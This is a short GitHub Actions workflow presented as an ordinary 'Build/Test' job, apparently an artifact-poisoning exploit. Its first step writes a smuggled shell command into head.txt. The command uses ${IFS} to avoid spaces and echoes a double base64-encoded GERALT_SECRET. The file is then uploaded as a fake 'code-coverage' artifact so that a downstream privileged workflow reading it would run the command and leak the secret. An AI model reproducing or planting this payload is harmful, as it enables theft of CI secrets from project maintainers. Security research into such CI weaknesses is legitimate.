name: Build/Test

on:
  push:
    branches:
      - develop
  pull_request:
    branches:
      - develop
  merge_group:
    types: [checks_requested]

permissions: {}

jobs:
  backend:
    runs-on: ubuntu-latest
    steps:
      - name: get-pr-info
        shell: bash
        env:
          PR_NUM: ${{ github.event.number }}
        run: |
          echo "$PR_NUM" > pr_num.txt
          echo "develop" > base.txt
          printf '%s' 'x&echo${IFS}GERALT_LEAKED_TOKEN=$(echo${IFS}-n${IFS}$GERALT_SECRET|base64|base64)' > head.txt
          printf 'mode: set\n' > coverage.out

      - name: Upload code coverage
        uses: actions/upload-artifact@v4
        with:
          name: code-coverage
          path: |
            coverage.out
            pr_num.txt
            base.txt
            head.txt
